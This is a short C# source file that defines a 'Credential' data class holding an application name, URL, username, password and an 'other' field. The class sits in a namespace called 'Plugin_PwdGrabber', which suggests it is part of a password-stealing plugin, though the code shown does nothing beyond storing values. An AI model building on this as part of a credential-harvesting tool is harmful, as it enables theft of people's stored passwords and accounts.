using System;
using System.Collections.Generic;
using System.Text;

namespace Plugin_PwdGrabber
{
    public class Credential
    {
        public string _ApplicationName { get; set; }
        public string _Url { get; set; }
        public string _UserName { get; set; }
        public string _Password { get; set; }

        public string _Other { get; set; }

        public Credential(string ApplicationName, string Url, string UserName, string Password, string Other)
        {
            _ApplicationName = ApplicationName;
            _Url = Url;
            _UserName = UserName;
            _Password = Password;
            _Other = Other;
        }
    }
}
